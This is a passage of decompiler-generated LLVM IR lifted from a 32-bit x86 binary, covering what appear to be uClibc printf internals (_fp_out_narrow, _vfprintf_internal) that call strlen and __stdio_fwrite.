  br i1 %v8_8050e28, label %dec_label_pc_8050e12, label %dec_label_pc_8050e2b.loopexit

dec_label_pc_8050e2b.loopexit:                    ; preds = %dec_label_pc_8050e12, %dec_label_pc_8050e17
  %v1_8050e2b.ph = phi i32 [ %v0_8050e12, %dec_label_pc_8050e17 ], [ 0, %dec_label_pc_8050e12 ]
  %v0_8050e2b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050e2b

dec_label_pc_8050e2b:                             ; preds = %dec_label_pc_8050e2b.loopexit, %entry
  %v0_8050e2b = phi i32 [ 0, %entry ], [ %v0_8050e2b.pre, %dec_label_pc_8050e2b.loopexit ]
  %v1_8050e2b = phi i32 [ 0, %entry ], [ %v1_8050e2b.ph, %dec_label_pc_8050e2b.loopexit ]
  %v2_8050e2b = sub i32 %v0_8050e2b, %v1_8050e2b
  store i32 %v0_8050e02, i32* @ebx, align 4
  store i32 %v0_8050e01, i32* @esi, align 4
  store i32 %v0_8050e00, i32* @edi, align 4
  ret i32 %v2_8050e2b

; uselistorder directives
  uselistorder i32 %v1_8050e12, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_8050e2b.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_8050e49 = trunc i32 %arg2 to i8
  %v5_8050e49 = icmp slt i8 %v3_8050e49, 0
  %v1_8050e4b = icmp eq i1 %v5_8050e49, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_8050e4b, label %dec_label_pc_8050e7c, label %dec_label_pc_8050e4d

dec_label_pc_8050e4d:                             ; preds = %entry
  %v3_8050e54 = call i32 @strlen(i8* %arg4)
  %v0_8050e5c = load i32, i32* @ebx, align 4
  %v2_8050e5c = sub i32 %v0_8050e5c, %v3_8050e54
  store i32 %v2_8050e5c, i32* @ebx, align 4
  store i32 %v3_8050e54, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_8050e5c, 1
  br i1 %tmp23, label %dec_label_pc_8050e7a, label %dec_label_pc_8050e64

dec_label_pc_8050e64:                             ; preds = %dec_label_pc_8050e4d
  %v0_8050e64 = load i32, i32* @edi, align 4
  %v1_8050e64 = urem i32 %v0_8050e64, 128
  store i32 %v1_8050e64, i32* @edi, align 4
  store i32 %v2_8050e5c, i32* @ecx, align 4
  store i32 %v1_8050e64, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_8050e6f = call i32 @_charpad()
  store i32 %v0_8050e6f, i32* @ebp, align 4
  %v12_8050e76 = icmp eq i32 %v0_8050e6f, %v2_8050e5c
  %v1_8050e78 = icmp eq i1 %v12_8050e76, false
  br i1 %v1_8050e78, label %dec_label_pc_8050e96, label %dec_label_pc_8050e64.dec_label_pc_8050e7a_crit_edge

dec_label_pc_8050e64.dec_label_pc_8050e7a_crit_edge: ; preds = %dec_label_pc_8050e64
  %v0_8050e7a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050e7a

dec_label_pc_8050e7a:                             ; preds = %dec_label_pc_8050e64.dec_label_pc_8050e7a_crit_edge, %dec_label_pc_8050e4d
  %v0_8050e7a = phi i32 [ %v0_8050e7a.pre, %dec_label_pc_8050e64.dec_label_pc_8050e7a_crit_edge ], [ %v3_8050e54, %dec_label_pc_8050e4d ]
  store i32 %v0_8050e7a, i32* @ebx, align 4
  br label %dec_label_pc_8050e7c

dec_label_pc_8050e7c:                             ; preds = %entry, %dec_label_pc_8050e7a
  %v0_8050e87 = phi i32 [ %arg3, %entry ], [ %v0_8050e7a, %dec_label_pc_8050e7a ]
  %tmp24 = icmp slt i32 %v0_8050e87, 1
  br i1 %tmp24, label %dec_label_pc_8050e94, label %dec_label_pc_8050e82

dec_label_pc_8050e82:                             ; preds = %dec_label_pc_8050e7c
  %v0_8050e82 = load i32, i32* @ecx, align 4
  %v5_8050e8c = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_8050e87, i32 %arg1, i32 %v0_8050e82)
  br label %dec_label_pc_8050e94

dec_label_pc_8050e94:                             ; preds = %dec_label_pc_8050e7c, %dec_label_pc_8050e82
  %v1_8050e94 = phi i32 [ 0, %dec_label_pc_8050e7c ], [ %v5_8050e8c, %dec_label_pc_8050e82 ]
  %v0_8050e94 = load i32, i32* @ebp, align 4
  %v2_8050e94 = add i32 %v0_8050e94, %v1_8050e94
  br label %dec_label_pc_8050e96

dec_label_pc_8050e96:                             ; preds = %dec_label_pc_8050e64, %dec_label_pc_8050e94
  %v0_8050e99 = phi i32 [ %v0_8050e6f, %dec_label_pc_8050e64 ], [ %v2_8050e94, %dec_label_pc_8050e94 ]
  ret i32 %v0_8050e99

; uselistorder directives
  uselistorder i32 %v0_8050e87, { 1, 0 }
  uselistorder i32 %v0_8050e6f, { 1, 0, 2 }
  uselistorder i32 %v1_8050e64, { 1, 0 }
  uselistorder i32 %v2_8050e5c, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050e96, { 1, 0 }
  uselistorder label %dec_label_pc_8050e94, { 1, 0 }
  uselistorder label %dec_label_pc_8050e7c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_8050eaa = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050eaa, i32* @ebx, align 4
  %v2_8050eb2 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8050eb2, i32* @esi, align 4
  %v5_8050eb7 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_8050eaa)
  store i32 %v5_8050eb7, i32* %eax.global-to-local, align 4
  %v2_8050ebf = icmp slt i32 %v5_8050eb7, 0
  %v1_8050ec1 = icmp eq i1 %v2_8050ebf, false
  br i1 %v1_8050ec1, label %dec_label_pc_8050f01, label %dec_label_pc_8050ec3

dec_label_pc_8050ec3:                             ; preds = %entry
  %v3_8050ec3 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8050ec3, i32* @ebx, align 4
  %v5_8050eca = inttoptr i32 %v3_8050ec3 to i8*
  %v3_8050ecb = call i32 @strlen(i8* %v5_8050eca)
  store i32 %v3_8050ecb, i32* %eax.global-to-local, align 4
  %v1_8050ed3 = icmp eq i32 %v3_8050ecb, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_8050ed3, label %dec_label_pc_805143a, label %dec_label_pc_8050ee2

dec_label_pc_8050ee2:                             ; preds = %dec_label_pc_8050ec3
  %v0_8050ee2 = load i32, i32* @edx, align 4
  %v0_8050eeb = load i32, i32* @ebx, align 4
  %v6_8050eec = call i32 @__stdio_fwrite(i32 %v0_8050eeb, i32 %v3_8050ecb, i32 %arg1, i32 %v0_8050ee2)
  store i32 %v6_8050eec, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_805143a

dec_label_pc_8050f01:                             ; preds = %entry
  %v6_8050f0b = call i32 @_ppfs_prepargs(i32 %v2_8050eb2, i32 %arg3, i32 %v5_8050eb7, i32 %v5_8050eb7)
  store i32 %v6_8050f0b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_8050f18 = load i32, i32* @ebx, align 4
  store i32 %v0_8050f18, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050f20

dec_label_pc_8050f1f:                             ; preds = %dec_label_pc_8050f26
  %v1_8050f1f = add i32 %v0_8050f2e, 1
  store i32 %v1_8050f1f, i32* @ebx, align 4
  br label %dec_label_pc_8050f20.backedge

dec_label_pc_8050f20.backedge:                    ; preds = %dec_label_pc_8050f1f, %dec_label_pc_8051420, %dec_label_pc_805142b
  %v1_8050f2a20 = phi i32 [ %v1_8050f32, %dec_label_pc_8050f1f ], [ %v3_8051420, %dec_label_pc_8051420 ], [ %v1_8050f5e, %dec_label_pc_805142b ]
  %v0_8050f2018 = phi i32 [ %v1_8050f1f, %dec_label_pc_8050f1f ], [ %v3_8051420, %dec_label_pc_8051420 ], [ %v1_805142b, %dec_label_pc_805142b ]
  %v4_8050f20.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f20

dec_label_pc_8050f20:                             ; preds = %dec_label_pc_8050f20.backedge, %dec_label_pc_8050f01
  %v1_8050f32 = phi i32 [ %v1_8050f2a20, %dec_label_pc_8050f20.backedge ], [ %v0_8050f18, %dec_label_pc_8050f01 ]
  %v0_8050f2e = phi i32 [ %v0_8050f2018, %dec_label_pc_8050f20.backedge ], [ %v0_8050f18, %dec_label_pc_8050f01 ]
  %v4_8050f20 = phi i32 [ %v4_8050f20.pre, %dec_label_pc_8050f20.backedge ], [ %v6_8050f0b, %dec_label_pc_8050f01 ]
  %v1_8050f20 = inttoptr i32 %v0_8050f2e to i8*
  %v2_8050f20 = load i8, i8* %v1_8050f20, align 1
  %v3_8050f20 = zext i8 %v2_8050f20 to i32
  %v5_8050f20 = and i32 %v4_8050f20, -256
  %v6_8050f20 = or i32 %v3_8050f20, %v5_8050f20
  store i32 %v6_8050f20, i32* %eax.global-to-local, align 4
  %v4_8050f22 = icmp eq i8 %v2_8050f20, 0
  br i1 %v4_8050f22, label %dec_label_pc_8050f2a, label %dec_label_pc_8050f26

dec_label_pc_8050f26:                             ; preds = %dec_label_pc_8050f20
  %v10_8050f26 = icmp eq i8 %v2_8050f20, 37
  %v1_8050f28 = icmp eq i1 %v10_8050f26, false
  br i1 %v1_8050f28, label %dec_label_pc_8050f1f, label %dec_label_pc_8050f2a

dec_label_pc_8050f2a:                             ; preds = %dec_label_pc_8050f26, %dec_label_pc_8050f20
  %v2_8050f2a = sub i32 %v0_8050f2e, %v1_8050f32
  %v12_8050f2a = icmp eq i32 %v2_8050f2a, 0
  br i1 %v12_8050f2a, label %dec_label_pc_8050f55, label %dec_label_pc_8050f2e

dec_label_pc_8050f2e:                             ; preds = %dec_label_pc_8050f2a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8050f2a, i32* @esi, align 4
  %tmp67 = icmp slt i32 %v2_8050f2a, 1
  br i1 %tmp67, label %dec_label_pc_8050f4a, label %dec_label_pc_8050f38

dec_label_pc_8050f38:                             ; preds = %dec_label_pc_8050f2e
  %v0_8050f38 = load i32, i32* @ebp, align 4
  %v1_8050f38 = load i32, i32* @esp, align 4
  %v2_8050f38 = add i32 %v1_8050f38, -4
  %v3_8050f38 = inttoptr i32 %v2_8050f38 to i32*
  store i32 %v0_8050f38, i32* %v3_8050f38, align 4
  %v1_8050f39 = add i32 %v1_8050f38, 368
  %v2_8050f39 = inttoptr i32 %v1_8050f39 to i32*
  %v3_8050f39 = load i32, i32* %v2_8050f39, align 4
  %v5_8050f39 = add i32 %v1_8050f38, -8
  %v6_8050f39 = inttoptr i32 %v5_8050f39 to i32*
  store i32 %v3_8050f39, i32* %v6_8050f39, align 4
  %v0_8050f40 = load i32, i32* @esi, align 4
  %v2_8050f40 = add i32 %v1_8050f38, -12
  %v3_8050f40 = inttoptr i32 %v2_8050f40 to i32*
  store i32 %v0_8050f40, i32* %v3_8050f40, align 4
  %v0_8050f41 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050f41 = add i32 %v1_8050f38, -16
  %v3_8050f41 = inttoptr i32 %v2_8050f41 to i32*
  store i32 %v0_8050f41, i32* %v3_8050f41, align 4
  %v0_8050f42 = load i32, i32* %stack_var_-364, align 4
  %v4_8050f42 = call i32 @__stdio_fwrite(i32 %v0_8050f42, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050f42, i32* %eax.global-to-local, align 4
  %v1_8050f4a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050f4a

dec_label_pc_8050f4a:                             ; preds = %dec_label_pc_8050f2e, %dec_label_pc_8050f38
  %v3_8050f52 = phi i32 [ %v2_8050f2a, %dec_label_pc_8050f2e ], [ %v1_8050f4a.pre, %dec_label_pc_8050f38 ]
  %v0_8050f4a = phi i32 [ 0, %dec_label_pc_8050f2e ], [ %v4_8050f42, %dec_label_pc_8050f38 ]
  %v12_8050f4a = icmp eq i32 %v0_8050f4a, %v3_8050f52
  %v1_8050f4c = icmp eq i1 %v12_8050f4a, false
  %v0_8051433.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_8050f4c, label %dec_label_pc_8051433, label %dec_label_pc_8050f52

dec_label_pc_8050f52:                             ; preds = %dec_label_pc_8050f4a
  %v1_8050f52 = inttoptr i32 %v0_8051433.pre.pre to i32*
  %v2_8050f52 = load i32, i32* %v1_8050f52, align 4
  %v4_8050f52 = add i32 %v2_8050f52, %v3_8050f52
  store i32 %v4_8050f52, i32* %v1_8050f52, align 4
  %v0_8050f55.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050f55

dec_label_pc_8050f55:                             ; preds = %dec_label_pc_8050f2a, %dec_label_pc_8050f52
  %v0_805142b = phi i32 [ %v0_8050f2e, %dec_label_pc_8050f2a ], [ %v0_8050f55.pre, %dec_label_pc_8050f52 ]
  %v1_8050f55 = inttoptr i32 %v0_805142b to i8*
  %v2_8050f55 = load i8, i8* %v1_8050f55, align 1
  %v3_8050f55 = icmp eq i8 %v2_8050f55, 0
  br i1 %v3_8050f55, label %dec_label_pc_805143a, label %dec_label_pc_8050f5e

dec_label_pc_8050f5e:                             ; preds = %dec_label_pc_8050f55
  %v1_8050f5e = add i32 %v0_805142b, 1
  store i32 %v1_8050f5e, i32* %edx.global-to-local, align 4
  %v2_8050f61 = inttoptr i32 %v1_8050f5e to i8*
  %v3_8050f61 = load i8, i8* %v2_8050f61, align 1
  %v12_8050f61 = icmp eq i8 %v3_8050f61, 37
  br i1 %v12_8050f61, label %dec_label_pc_805142b, label %dec_label_pc_8050f6b

dec_label_pc_8050f6b:                             ; preds = %dec_label_pc_8050f5e
  %v1_8050f6b = load i32, i32* @esp, align 4
  %v2_8050f6b = add i32 %v1_8050f6b, 16
  %v3_8050f6b = inttoptr i32 %v2_8050f6b to i32*
  store i32 %v1_8050f5e, i32* %v3_8050f6b, align 4
  %v0_8050f6f = load i32, i32* @esp, align 4
  %v1_8050f6f = add i32 %v0_8050f6f, 340
  %v2_8050f6f = inttoptr i32 %v1_8050f6f to i32*
  store i32 0, i32* %v2_8050f6f, align 4
  %v0_8050f7a = load i32, i32* @esp, align 4
  %v1_8050f7d = add i32 %v0_8050f7a, 16
  store i32 %v1_8050f7d, i32* @ebx, align 4
  %v2_8050f81 = add i32 %v0_8050f7a, -16
  %v3_8050f81 = inttoptr i32 %v2_8050f81 to i32*
  store i32 %v1_8050f7d, i32* %v3_8050f81, align 4
  %v0_8050f82 = load i32, i32* %stack_var_-364, align 4
  %v1_8050f82 = inttoptr i32 %v0_8050f82 to i32*
  %v2_8050f82 = call i32 @_ppfs_parsespec(i32* %v1_8050f82)
  store i32 %v2_8050f82, i32* %eax.global-to-local, align 4
  %v0_8050f87 = load i32, i32* @ebx, align 4
  %v1_8050f87 = load i32, i32* @esp, align 4
  %v2_8050f87 = inttoptr i32 %v1_8050f87 to i32*
  store i32 %v0_8050f87, i32* %v2_8050f87, align 4
  %v0_8050f8a = load i32, i32* %stack_var_-364, align 4
  %v1_8050f8a = call i32 @_ppfs_setargs(i32 %v0_8050f8a)
  store i32 %v1_8050f8a, i32* %eax.global-to-local, align 4
  %v0_8050f8f = load i32, i32* @esp, align 4
  %v1_8050f8f = add i32 %v0_8050f8f, 70
  %v2_8050f8f = inttoptr i32 %v1_8050f8f to i8*
  %v3_8050f8f = load i8, i8* %v2_8050f8f, align 1
  %v4_8050f8f = zext i8 %v3_8050f8f to i32
  store i32 %v4_8050f8f, i32* @edi, align 4
  %v1_8050f94 = add i32 %v0_8050f8f, 16
  %v1_8050f97 = add i32 %v0_8050f8f, 56
  %v2_8050f97 = inttoptr i32 %v1_8050f97 to i32*
  %v3_8050f97 = load i32, i32* %v2_8050f97, align 4
  %v1_8050f9c = add i32 %v0_8050f8f, 112
  store i32 %v1_8050f9c, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_8050f97, 1
  br i1 %tmp68, label %dec_label_pc_8050fa9, label %dec_label_pc_8050fa2

dec_label_pc_8050fa2:                             ; preds = %dec_label_pc_8050f6b
  %v2_8050fa2 = zext i8 %v3_8050f8f to i32
  %v3_8050fa2 = mul nuw nsw i32 %v2_8050fa2, 12
  store i32 %v3_8050fa2, i32* %eax.global-to-local, align 4
  %v2_8050fa5 = add i32 %v0_8050f8f, 100
  %v3_8050fa5 = add i32 %v2_8050fa5, %v3_8050fa2
  store i32 %v3_8050fa5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050fa9

dec_label_pc_8050fa9:                             ; preds = %dec_label_pc_8050f6b, %dec_label_pc_8050fa2
  %v0_8050fb128 = phi i32 [ %v1_8050f9c, %dec_label_pc_8050f6b ], [ %v3_8050fa5, %dec_label_pc_8050fa2 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8050fab = add i32 %v0_8050f8f, 60
  %v2_8050fab = inttoptr i32 %v1_8050fab to i32*
  %v3_8050fab = load i32, i32* %v2_8050fab, align 4
  store i32 %v3_8050fab, i32* %ecx.global-to-local, align 4
  %v2_8050fbc81 = sub i32 0, %v3_8050fab
  %v10_8050fbc84 = and i32 %v3_8050fab, %v2_8050fbc81
  %v11_8050fbc85 = icmp slt i32 %v10_8050fbc84, 0
  %v13_8050fbc86 = icmp slt i32 %v2_8050fbc81, 0
  %v2_8050fbe87 = icmp eq i1 %v13_8050fbc86, %v11_8050fbc85
  br i1 %v2_8050fbe87, label %dec_label_pc_8050fc0, label %dec_label_pc_8050fb1

dec_label_pc_8050fb1:                             ; preds = %dec_label_pc_8050fa9, %dec_label_pc_8050fb1
  %v0_8050fc091 = phi i32 [ %v0_8050fc0, %dec_label_pc_8050fb1 ], [ %v1_8050f94, %dec_label_pc_8050fa9 ]
  %v2_8050fb190 = phi i32 [ %v1_8050fbb, %dec_label_pc_8050fb1 ], [ 0, %dec_label_pc_8050fa9 ]
  %v0_8050fb189 = phi i32 [ %v1_8050fb8, %dec_label_pc_8050fb1 ], [ %v0_8050fb128, %dec_label_pc_8050fa9 ]
  %v3_8050fb1 = mul i32 %v2_8050fb190, 4
  %v4_8050fb1 = add i32 %v0_8050fc091, 344
  %v5_8050fb1 = add i32 %v4_8050fb1, %v3_8050fb1
  %v6_8050fb1 = inttoptr i32 %v5_8050fb1 to i32*
  store i32 %v0_8050fb189, i32* %v6_8050fb1, align 4
  %v0_8050fb8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050fb8 = add i32 %v0_8050fb8, 12
  store i32 %v1_8050fb8, i32* %edx.global-to-local, align 4
  %v0_8050fbb = load i32, i32* %eax.global-to-local, align 4
  %v1_8050fbb = add i32 %v0_8050fbb, 1
  store i32 %v1_8050fbb, i32* %eax.global-to-local, align 4
  %v1_8050fbc.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050fbc = sub i32 %v1_8050fbb, %v1_8050fbc.pre
  %v8_8050fbc = xor i32 %v1_8050fbb, %v1_8050fbc.pre
  %v9_8050fbc = xor i32 %v2_8050fbc, %v1_8050fbb
  %v10_8050fbc = and i32 %v9_8050fbc, %v8_8050fbc
  %v11_8050fbc = icmp slt i32 %v10_8050fbc, 0
  %v13_8050fbc = icmp slt i32 %v2_8050fbc, 0
  %v2_8050fbe = icmp eq i1 %v13_8050fbc, %v11_8050fbc
  %v0_8050fc0 = load i32, i32* @esp, align 4
  br i1 %v2_8050fbe, label %dec_label_pc_8050fc0, label %dec_label_pc_8050fb1

dec_label_pc_8050fc0:                             ; preds = %dec_label_pc_8050fb1, %dec_label_pc_8050fa9
  %v0_8050fc0.lcssa = phi i32 [ %v1_8050f94, %dec_label_pc_8050fa9 ], [ %v0_8050fc0, %dec_label_pc_8050fb1 ]
  %v1_8050fc0 = add i32 %v0_8050fc0.lcssa, 48
  %v2_8050fc0 = inttoptr i32 %v1_8050fc0 to i32*
  %v3_8050fc0 = load i32, i32* %v2_8050fc0, align 4
  store i32 %v3_8050fc0, i32* @ecx, align 4
  %v1_8050fc4 = icmp eq i32 %v3_8050fc0, 0
  %v1_8050fc6 = icmp eq i1 %v1_8050fc4, false
  br i1 %v1_8050fc6, label %dec_label_pc_8050fee, label %dec_label_pc_8050fc8

dec_label_pc_8050fc8:                             ; preds = %dec_label_pc_8050fc0
  %v1_8050fc8 = inttoptr i32 %v0_8050fc0.lcssa to i32*
  %v2_8050fc8 = load i32, i32* %v1_8050fc8, align 4
  store i32 %v2_8050fc8, i32* %eax.global-to-local, align 4
  %v1_8050fcb = ashr i32 %v2_8050fc8, 31
  store i32 %v1_8050fcb, i32* %edx.global-to-local, align 4
  %v2_8050fcc = add i32 %v0_8050fc0.lcssa, -4
  %v3_8050fcc = inttoptr i32 %v2_8050fcc to i32*
  store i32 %v1_8050fcb, i32* %v3_8050fcc, align 4
  %v0_8050fcd = load i32, i32* %eax.global-to-local, align 4
  %v2_8050fcd = add i32 %v0_8050fc0.lcssa, -8
  %v3_8050fcd = inttoptr i32 %v2_8050fcd to i32*
  store i32 %v0_8050fcd, i32* %v3_8050fcd, align 4
  %v1_8050fce = add i32 %v0_8050fc0.lcssa, 32
  %v2_8050fce = inttoptr i32 %v1_8050fce to i32*
  %v3_8050fce = load i32, i32* %v2_8050fce, align 4
  %v1_8050fd2 = and i32 %v3_8050fce, 3840
  store i32 %v1_8050fd2, i32* %eax.global-to-local, align 4
  %v2_8050fd7 = add i32 %v0_8050fc0.lcssa, -12
  %v3_8050fd7 = inttoptr i32 %v2_8050fd7 to i32*
  store i32 %v1_8050fd2, i32* %v3_8050fd7, align 4
  %v1_8050fd8 = add i32 %v0_8050fc0.lcssa, 344
  %v2_8050fd8 = inttoptr i32 %v1_8050fd8 to i32*
  %v3_8050fd8 = load i32, i32* %v2_8050fd8, align 4
  store i32 %v3_8050fd8, i32* %eax.global-to-local, align 4
  %v1_8050fdf = inttoptr i32 %v3_8050fd8 to i32*
  %v2_8050fdf = load i32, i32* %v1_8050fdf, align 4
  %v4_8050fdf = add i32 %v0_8050fc0.lcssa, -16
  %v5_8050fdf = inttoptr i32 %v4_8050fdf to i32*
  store i32 %v2_8050fdf, i32* %v5_8050fdf, align 4
  %v0_8050fe1 = call i32 @_store_inttype()
  store i32 %v0_8050fe1, i32* %eax.global-to-local, align 4
  %v0_8050fe6 = load i32, i32* @esp, align 4
  %v1_8050fe6 = add i32 %v0_8050fe6, 16
  br label %dec_label_pc_8051420

dec_label_pc_8050fee:                             ; preds = %dec_label_pc_8050fc0
  %tmp94 = icmp ult i32 %v3_8050fc0, 8
  br i1 %tmp94, label %dec_label_pc_8050ff7, label %dec_label_pc_8051158

dec_label_pc_8050ff7:                             ; preds = %dec_label_pc_8050fee
  %v1_8050ff7 = add i32 %v3_8050fc0, 134583056
  %v2_8050ff7 = inttoptr i32 %v1_8050ff7 to i8*
  %v3_8050ff7 = load i8, i8* %v2_8050ff7, align 1
  %v4_8050ff7 = sext i8 %v3_8050ff7 to i32
  store i32 %v4_8050ff7, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_8051003 = icmp eq i8 %v3_8050ff7, 10
  %v1_8051006 = icmp eq i1 %v9_8051003, false
  br i1 %v1_8051006, label %dec_label_pc_8051024, label %dec_label_pc_8051008

dec_label_pc_8051008:                             ; preds = %dec_label_pc_8050ff7
  %v1_8051008 = add i32 %v0_8050fc0.lcssa, 32
  %v2_8051008 = inttoptr i32 %v1_8051008 to i32*
  %v3_8051008 = load i32, i32* %v2_8051008, align 4
  %v1_805100e = and i32 %v3_8051008, 32
  store i32 %v1_805100e, i32* %eax.global-to-local, align 4
  %tmp69 = udiv i32 %v1_805100e, 32
  %tmp70 = sub nsw i32 45, %tmp69
  store i32 %tmp70, i32* @ebx, align 4
  %v1_805101c = trunc i32 %v3_8051008 to i8
  %v2_805101c = and i8 %v1_805101c, 64
  %v3_805101c = icmp eq i8 %v2_805101c, 0
  %v5_805101c = zext i8 %v2_805101c to i32
  %v7_805101c = and i32 %v3_8051008, -256
  %v8_805101c = or i32 %v5_805101c, %v7_805101c
  store i32 %v8_805101c, i32* %edx.global-to-local, align 4
  br i1 %v3_805101c, label %dec_label_pc_8051024, label %dec_label_pc_8051021

dec_label_pc_8051021:                             ; preds = %dec_label_pc_8051008
  %v2_8051021 = or i32 %tmp70, 128
  store i32 %v2_8051021, i32* @ebx, align 4
  br label %dec_label_pc_8051024

dec_label_pc_8051024:                             ; preds = %dec_label_pc_8051008, %dec_label_pc_8050ff7, %dec_label_pc_8051021
  %tmp95 = icmp ult i32 %v3_8050fc0, 6
  br i1 %tmp95, label %dec_label_pc_8051029, label %dec_label_pc_8051041

dec_label_pc_8051029:                             ; preds = %dec_label_pc_8051024
  %v9_8051029 = icmp eq i32 %v3_8050fc0, 3
  %v1_805102c = icmp eq i1 %v9_8051029, false
  br i1 %v1_805102c, label %dec_label_pc_8051035, label %dec_label_pc_805102e

dec_label_pc_805102e:                             ; preds = %dec_label_pc_8051029
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_8051043

dec_label_pc_8051035:                             ; preds = %dec_label_pc_8051029
  %v9_805103a = icmp eq i32 %v3_8050fc0, 1
  br i1 %v9_805103a, label %dec_label_pc_8051048, label %dec_label_pc_8051043

dec_label_pc_8051041:                             ; preds = %dec_label_pc_8051024
  %v1_8051041 = sub nsw i32 0, %v4_8050ff7
  store i32 %v1_8051041, i32* @esi, align 4
  br label %dec_label_pc_8051043

dec_label_pc_8051043:                             ; preds = %dec_label_pc_8051035, %dec_label_pc_805102e, %dec_label_pc_8051041
  br label %dec_label_pc_8051048

dec_label_pc_8051048:                             ; preds = %dec_label_pc_8051035, %dec_label_pc_8051043
  %storemerge106 = phi i32 [ 11, %dec_label_pc_8051043 ], [ 6, %dec_label_pc_8051035 ]
  store i32 %storemerge106, i32* @ebp, align 4
  %v1_8051048 = add i32 %v0_8050fc0.lcssa, 7
  %v2_8051048 = inttoptr i32 %v1_8051048 to i8*
  store i8 32, i8* %v2_8051048, align 1
  %v0_805104d = load i32, i32* @esp, align 4
  %v1_805104d = add i32 %v0_805104d, 20
  %v2_805104d = inttoptr i32 %v1_805104d to i32*
  %v3_805104d = load i32, i32* %v2_805104d, align 4
  %v5_805104d = icmp slt i32 %v3_805104d, 0
  %v1_8051052 = icmp eq i1 %v5_805104d, false
  br i1 %v1_8051052, label %dec_label_pc_805105c, label %dec_label_pc_8051054

dec_label_pc_8051054:                             ; preds = %dec_label_pc_8051048
  %v1_8051054 = add i32 %v0_805104d, 36
  %v2_8051054 = inttoptr i32 %v1_8051054 to i8*
  %v3_8051054 = load i8, i8* %v2_8051054, align 1
  %v4_8051054 = zext i8 %v3_8051054 to i32
  %v5_8051054 = load i32, i32* %edx.global-to-local, align 4
  %v6_8051054 = and i32 %v5_8051054, -256
  %v7_8051054 = or i32 %v6_8051054, %v4_8051054
  store i32 %v7_8051054, i32* %edx.global-to-local, align 4
  %v3_8051058 = add i32 %v0_805104d, 7
  %v4_8051058 = inttoptr i32 %v3_8051058 to i8*
  store i8 %v3_8051054, i8* %v4_8051058, align 1
  %v0_805105c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805105c

dec_label_pc_805105c:                             ; preds = %dec_label_pc_8051048, %dec_label_pc_8051054
  %v1_8051075 = phi i32 [ %v0_805104d, %dec_label_pc_8051048 ], [ %v0_805105c.pre, %dec_label_pc_8051054 ]
  %v1_805105c = add i32 %v1_8051075, 344
  %v2_805105c = inttoptr i32 %v1_805105c to i32*
  %v3_805105c = load i32, i32* %v2_805105c, align 4
  store i32 %v3_805105c, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_8051068 = add i32 %v3_8050fc0, -1
  %v8_8051068 = icmp eq i32 %v1_8051068, 0
  store i32 %v1_8051068, i32* %ecx.global-to-local, align 4
  %v0_8051075.pre = load i32, i32* @edi, align 4
  br i1 %v8_8051068, label %dec_label_pc_8051075, label %dec_label_pc_805106b

dec_label_pc_805106b:                             ; preds = %dec_label_pc_805105c
  %v2_805106b = mul i32 %v0_8051075.pre, 4
  %v3_805106b = add i32 %v1_8051075, 52
  %v4_805106b = add i32 %v3_805106b, %v2_805106b
  %v5_805106b = inttoptr i32 %v4_805106b to i32*
  %v6_805106b = load i32, i32* %v5_805106b, align 4
  %v1_805106f = and i32 %v6_805106b, 3840
  store i32 %v1_805106f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051075

dec_label_pc_8051075:                             ; preds = %dec_label_pc_805105c, %dec_label_pc_805106b
  %v2_8051075 = add i32 %v1_8051075, -4
  %v3_8051075 = inttoptr i32 %v2_8051075 to i32*
  store i32 %v0_8051075.pre, i32* %v3_8051075, align 4
  %v0_8051076 = load i32, i32* @esi, align 4
  %v2_8051076 = add i32 %v1_8051075, -8
  %v3_8051076 = inttoptr i32 %v2_8051076 to i32*
  store i32 %v0_8051076, i32* %v3_8051076, align 4
  %v0_8051077 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051077 = add i32 %v1_8051075, -12
